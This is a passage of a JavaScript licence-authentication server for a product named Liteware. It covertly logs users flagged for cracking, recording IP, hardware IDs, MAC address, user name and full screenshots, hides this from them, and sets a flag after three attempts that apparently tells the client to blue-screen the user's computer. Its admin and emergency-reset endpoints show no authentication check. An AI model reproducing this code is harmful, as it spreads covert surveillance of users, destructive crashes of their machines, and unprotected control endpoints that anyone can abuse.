        crackLog.attempt_number = attemptData.count;
        crackLog.will_bsod = attemptData.count >= 3;

        console.log(`🚨 CRACK ATTEMPT LOGGED: ${detected_tool} from ${ip}`);
        console.log(`   HWID: ${hwid || gpu_hash}`);
        console.log(`   MAC: ${mac_address}`);
        console.log(`   CPU: ${cpu}`);
        console.log(`   GPU: ${gpu}`);
        console.log(`   User: ${computer_name}\\${username}`);
        console.log(`   Screenshot: ${crackLog.has_screenshot ? 'YES' : 'NO'}`);
        console.log(`   ⚠️ ATTEMPT #${attemptData.count}/3 ${attemptData.count >= 3 ? '- BSOD TRIGGERED!' : ''}`);

        res.json({ success: true, message: 'Crack attempt logged', id: crackLog.id, attempt_number: attemptData.count });
    } catch (error) {
        console.error('Error logging crack attempt:', error);
        // Still return success to not alert the cracker
        res.json({ success: true, message: 'Logged' });
    }
});

// Get crack attempts (admin)
app.post('/auth/admin/get-crack-attempts', (req, res) => {
    const { limit = 50, include_screenshots = false } = req.body;
    
    const logs = crackAttempts.slice(0, Math.min(limit, MAX_CRACK_LOGS)).map(log => {
        const result = { ...log };
        if (!include_screenshots) {
            delete result.screenshot_full;
        }
        return result;
    });
    
    res.json({ 
        success: true, 
        count: logs.length,
        total: crackAttempts.length,
        attempts: logs 
    });
});

// Get single crack attempt with full screenshot
app.post('/auth/admin/get-crack-attempt', (req, res) => {
    const { id } = req.body;
    const attempt = crackAttempts.find(a => a.id === id);
    
    if (attempt) {
        res.json({ success: true, attempt });
    } else {
        res.json({ success: false, message: 'Attempt not found' });
    }
});

// Clear crack logs
app.post('/auth/admin/clear-crack-logs', (req, res) => {
    crackAttempts.length = 0;
    res.json({ success: true, message: 'Crack logs cleared' });
});

// Get crack stats
app.post('/auth/admin/crack-stats', (req, res) => {
    const last24h = crackAttempts.filter(a => a.timestamp > Date.now() - 24*60*60*1000).length;
    const lastWeek = crackAttempts.filter(a => a.timestamp > Date.now() - 7*24*60*60*1000).length;
    
    // Group by detection type
    const byType = {};
    crackAttempts.forEach(a => {
        byType[a.detection_type] = (byType[a.detection_type] || 0) + 1;
    });
    
    // Group by tool
    const byTool = {};
    crackAttempts.forEach(a => {
        byTool[a.detected_tool] = (byTool[a.detected_tool] || 0) + 1;
    });
    
    res.json({ 
        success: true, 
        total: crackAttempts.length,
        last_24h: last24h,
        last_week: lastWeek,
        by_type: byType,
        by_tool: byTool,
        unique_ips: [...new Set(crackAttempts.map(a => a.ip))].length,
        unique_hwids: [...new Set(crackAttempts.map(a => a.hwid))].length
    });
});

// ========================================
// ADMIN: STATUS & STATS
// ========================================
app.post('/auth/admin/status', (req, res) => {
    res.json({
        success: true,
        server_enabled: !serverDisabled,
        auth_enabled: authEnabled,
        maintenance_mode: maintenanceMode,
        lockdown_mode: lockdownMode,
        website_locked: websiteLocked,
        active_sessions: activeSessions.size,
        total_licenses: Object.keys(licenses).length,
        banned_ips: bannedIPs.size,
        banned_hwids: bannedHWIDs.size,
        crack_attempts: crackAttempts.length,
        uptime: process.uptime()
    });
});

app.post('/auth/admin/stats', (req, res) => {
        res.json({
            success: true,
        total_licenses: Object.keys(licenses).length,
        active_licenses: Object.values(licenses).filter(l => l.valid && l.activated).length,
        active_sessions: activeSessions.size,
        banned_ips: bannedIPs.size,
        banned_hwids: bannedHWIDs.size,
        whitelisted_ips: whitelistedIPs.size,
        crack_attempts: crackAttempts.length
    });
});

app.post('/auth/admin/security-stats', (req, res) => {
    // Count active licenses (activated and not expired)
    const now = Date.now();
    const activeCount = Object.values(licenses).filter(l => l.activated && l.valid && l.expires > now).length;
    
    res.json({
        success: true,
        banned_ips: bannedIPs.size,
        banned_hwids: bannedHWIDs.size,
        whitelisted_ips: whitelistedIPs.size,
        active_sessions: activeSessions.size,
        active_users: activeCount,
        total_keys: Object.keys(licenses).length,
        rate_limited: rateLimitStore.size,
        crack_attempts: crackAttempts.length,
        crack_attempts_24h: crackAttempts.filter(a => a.timestamp > Date.now() - 24*60*60*1000).length
    });
});

app.post('/auth/admin/get-all-status', (req, res) => {
    res.json({
        success: true,
        server_enabled: !serverDisabled,
        server_disabled: serverDisabled,
        auth_enabled: authEnabled,
        maintenance: maintenanceMode,
        lockdown: lockdownMode,
        website_locked: websiteLocked
    });
});

// ========================================
// ADMIN: SERVER CONTROLS
// ========================================
app.post('/auth/admin/toggle-server', (req, res) => {
    serverDisabled = !serverDisabled;
    res.json({ success: true, server_enabled: !serverDisabled });
});

app.post('/auth/admin/enable-server', (req, res) => {
    serverDisabled = false;
    res.json({ success: true, message: 'Server enabled' });
});

app.post('/auth/admin/disable-server', (req, res) => {
    serverDisabled = true;
    res.json({ success: true, message: 'Server disabled' });
});

app.post('/auth/admin/set-maintenance', (req, res) => {
    const { enabled } = req.body;
    maintenanceMode = enabled !== undefined ? enabled : !maintenanceMode;
    res.json({ success: true, maintenance_mode: maintenanceMode });
});

app.post('/auth/admin/set-lockdown', (req, res) => {
    const { enabled } = req.body;
    lockdownMode = enabled !== undefined ? enabled : !lockdownMode;
    res.json({ success: true, lockdown_mode: lockdownMode });
});

app.post('/auth/admin/set-auth-status', (req, res) => {
    const { enabled } = req.body;
    authEnabled = enabled !== undefined ? enabled : !authEnabled;
    res.json({ success: true, auth_enabled: authEnabled });
});

app.post('/auth/admin/set-server-status', (req, res) => {
    const { enabled } = req.body;
    serverDisabled = enabled !== undefined ? !enabled : serverDisabled;
    res.json({ success: true, server_enabled: !serverDisabled });
});

app.post('/auth/admin/set-website-lock', (req, res) => {
    const { locked } = req.body;
    websiteLocked = locked !== undefined ? locked : !websiteLocked;
    res.json({ success: true, website_locked: websiteLocked });
});

app.post('/auth/admin/lockdown', (req, res) => {
    const { enabled } = req.body;
    lockdownMode = enabled !== undefined ? enabled : !lockdownMode;
    res.json({ success: true, lockdown_mode: lockdownMode });
});

// ========================================
// ADMIN: IP MANAGEMENT
// ========================================
app.post('/auth/admin/whitelist-ip', (req, res) => {
    const { ip } = req.body;
    if (ip) { whitelistedIPs.add(ip); res.json({ success: true, message: `IP ${ip} whitelisted` }); }
    else res.json({ success: false, message: 'IP required' });
});

app.post('/auth/admin/unwhitelist-ip', (req, res) => {
    const { ip } = req.body;
    if (ip) { whitelistedIPs.delete(ip); res.json({ success: true, message: `IP ${ip} removed` }); }
    else res.json({ success: false, message: 'IP required' });
});

app.post('/auth/admin/list-whitelisted-ips', (req, res) => {
    res.json({ success: true, whitelisted_ips: Array.from(whitelistedIPs) });
});

app.post('/auth/admin/get-my-ip', (req, res) => {
    const ip = getIP(req);
    res.json({ success: true, ip, is_whitelisted: isWhitelisted(ip) });
});

app.post('/auth/admin/whitelist-my-ip', (req, res) => {
    const ip = getIP(req);
    whitelistedIPs.add(ip);
    res.json({ success: true, message: `Your IP ${ip} has been whitelisted`, ip });
});

app.post('/auth/admin/ban-ip', (req, res) => {
    const { ip } = req.body;
    if (ip) { bannedIPs.add(ip); res.json({ success: true, message: `IP ${ip} banned` }); }
    else res.json({ success: false, message: 'IP required' });
});

app.post('/auth/admin/unban-ip', (req, res) => {
    const { ip } = req.body;
    if (ip) { bannedIPs.delete(ip); res.json({ success: true, message: `IP ${ip} unbanned` }); }
    else res.json({ success: false, message: 'IP required' });
});

app.post('/auth/admin/list-banned-ips', (req, res) => {
    res.json({ success: true, banned_ips: Array.from(bannedIPs) });
});

// ========================================
// ADMIN: HWID MANAGEMENT
// ========================================
app.post('/auth/admin/ban-hwid', (req, res) => {
    const { hwid } = req.body;
    if (hwid) { bannedHWIDs.add(hwid); res.json({ success: true, message: `HWID banned` }); }
    else res.json({ success: false, message: 'HWID required' });
});

app.post('/auth/admin/unban-hwid', (req, res) => {
    const { hwid } = req.body;
    if (hwid) { bannedHWIDs.delete(hwid); res.json({ success: true, message: `HWID unbanned` }); }
    else res.json({ success: false, message: 'HWID required' });
});

app.post('/auth/admin/list-bans', (req, res) => {
    res.json({
        success: true,
        banned_ips: Array.from(bannedIPs),
        banned_hwids: Array.from(bannedHWIDs)
    });
});

app.post('/auth/admin/clear-all-bans', (req, res) => {
    bannedIPs.clear();
    bannedHWIDs.clear();
    res.json({ success: true, message: 'All bans cleared' });
});

// ========================================
// KEY WHITELIST MANAGEMENT (BSOD Protection)
// ========================================
app.post('/auth/admin/whitelist-key', (req, res) => {
    const { license_key } = req.body;
    if (license_key) {
    whitelistedKeys.add(license_key);
        res.json({ success: true, message: `Key ${license_key} whitelisted (BSOD protected)` });
    } else {
        res.json({ success: false, message: 'License key required' });
    }
});

app.post('/auth/admin/unwhitelist-key', (req, res) => {
    const { license_key } = req.body;
    if (license_key) {
        whitelistedKeys.delete(license_key);
        res.json({ success: true, message: `Key ${license_key} removed from whitelist` });
    } else {
        res.json({ success: false, message: 'License key required' });
    }
});

app.post('/auth/admin/list-whitelisted-keys', (req, res) => {
    res.json({ 
        success: true, 
        whitelisted_keys: Array.from(whitelistedKeys),
        count: whitelistedKeys.size
    });
});

// Check if a key is whitelisted (called from C++ client)
app.post('/auth/check-key-whitelist', (req, res) => {
    const { license_key } = req.body;
    if (!license_key) {
        return res.json({ success: false, whitelisted: false, message: 'License key required' });
    }
    const isWhitelisted = whitelistedKeys.has(license_key);
    res.json({ success: true, whitelisted: isWhitelisted });
});

// ========================================
// CRACK ATTEMPT COUNTER MANAGEMENT
// ========================================
app.post('/auth/admin/get-crack-counters', (req, res) => {
    const counters = [];
    const now = Date.now();
    
    crackAttemptCounter.forEach((data, hwid) => {
        // Check if 24 hours have passed
        const hoursElapsed = (now - data.firstAttempt) / (1000 * 60 * 60);
        counters.push({
            hwid,
            count: data.count,
            firstAttempt: data.firstAttempt,
            hoursElapsed: Math.floor(hoursElapsed),
            willReset: hoursElapsed >= 24
        });
    });
    
    res.json({ success: true, counters });
});

app.post('/auth/admin/reset-crack-counter', (req, res) => {
    const { hwid } = req.body;
    if (hwid) {
        crackAttemptCounter.delete(hwid);
        res.json({ success: true, message: `Counter reset for ${hwid}` });
    } else {
        res.json({ success: false, message: 'HWID required' });
    }
});

app.post('/auth/admin/reset-all-crack-counters', (req, res) => {
    crackAttemptCounter.clear();
    res.json({ success: true, message: 'All crack counters reset' });
});

// ========================================
// EMERGENCY RESET
// ========================================
app.post('/auth/emergency-reset', (req, res) => {
    bannedIPs.clear();
    bannedHWIDs.clear();
    rateLimitStore.clear();
    crackAttemptCounter.clear();
    ddosProtection.tempBans.clear();
    ddosProtection.suspiciousIPs.clear();
    ddosProtection.slidingWindow.clear();
    ddosProtection.burstTracking.clear();
    serverDisabled = false;
    maintenanceMode = false;
    lockdownMode = false;
    websiteLocked = false;
    authEnabled = true;
    res.json({ success: true, message: 'Emergency reset complete' });
});

// ========================================
// DDOS PROTECTION ADMIN ENDPOINTS
// ========================================
app.post('/auth/admin/ddos-stats', (req, res) => {
    res.json({
        success: true,
        stats: ddos.getStats(),
        settings: ddosProtection.settings,
        temp_bans: Array.from(ddosProtection.tempBans.entries()).map(([ip, data]) => ({
            ip: ip,
            reason: data.reason,
            expires_in: Math.ceil((data.expires - Date.now()) / 1000)
        })),
        suspicious_ips: Array.from(ddosProtection.suspiciousIPs)
    });
});

app.post('/auth/admin/ddos-unban', (req, res) => {
    const { ip } = req.body;
    if (!ip) return res.json({ success: false, message: 'IP required' });
    
    ddosProtection.tempBans.delete(ip);
    ddosProtection.suspiciousIPs.delete(ip);
    ddosProtection.requestCounts.delete(`suspicious:${ip}`);
    
    res.json({ success: true, message: `DDoS ban removed for ${ip}` });
});

app.post('/auth/admin/ddos-clear-all', (req, res) => {
    ddosProtection.tempBans.clear();
    ddosProtection.suspiciousIPs.clear();
    ddosProtection.slidingWindow.clear();
    ddosProtection.burstTracking.clear();
    ddosProtection.stats.activeBans = 0;
    
    res.json({ success: true, message: 'All DDoS bans cleared' });
});

app.post('/auth/admin/ddos-settings', (req, res) => {
    const { maxRequestsPerSecond, maxRequestsPerMinute, burstThreshold, tempBanDuration, challengeEnabled } = req.body;
    
    if (maxRequestsPerSecond !== undefined) ddosProtection.settings.maxRequestsPerSecond = maxRequestsPerSecond;
    if (maxRequestsPerMinute !== undefined) ddosProtection.settings.maxRequestsPerMinute = maxRequestsPerMinute;
    if (burstThreshold !== undefined) ddosProtection.settings.burstThreshold = burstThreshold;
    if (tempBanDuration !== undefined) ddosProtection.settings.tempBanDuration = tempBanDuration;
    if (challengeEnabled !== undefined) ddosProtection.settings.challengeEnabled = challengeEnabled;
    
    res.json({ success: true, message: 'DDoS settings updated', settings: ddosProtection.settings });
});

// ========================================
// VERIFY HWID
// ========================================
app.post('/auth/verify-hwid', (req, res) => {
    const { hwid, gpu_hash, motherboard_uuid, _challenge } = req.body;
    const hw = hwid || gpu_hash;
    
    if (bannedHWIDs.has(hw)) {
        return res.json(sign({ success: false, message: 'HWID banned' }, _challenge));
    }
    res.json(sign({ success: true, message: 'HWID valid' }, _challenge));
});

// ========================================
// START SERVER
// ========================================
const PORT = process.env.PORT || 3000;

    app.listen(PORT, () => {
    console.log(`✅ Liteware Auth Server running on port ${PORT}`);
    console.log(`📋 Total licenses: ${Object.keys(licenses).length}`);
    console.log(`🔑 Owner key: ${ownerKey.key.substring(0, 16)}...`);
});

process.on('uncaughtException', (err) => console.error('Error:', err.message));
process.on('unhandledRejection', (reason) => console.error('Rejection:', reason));
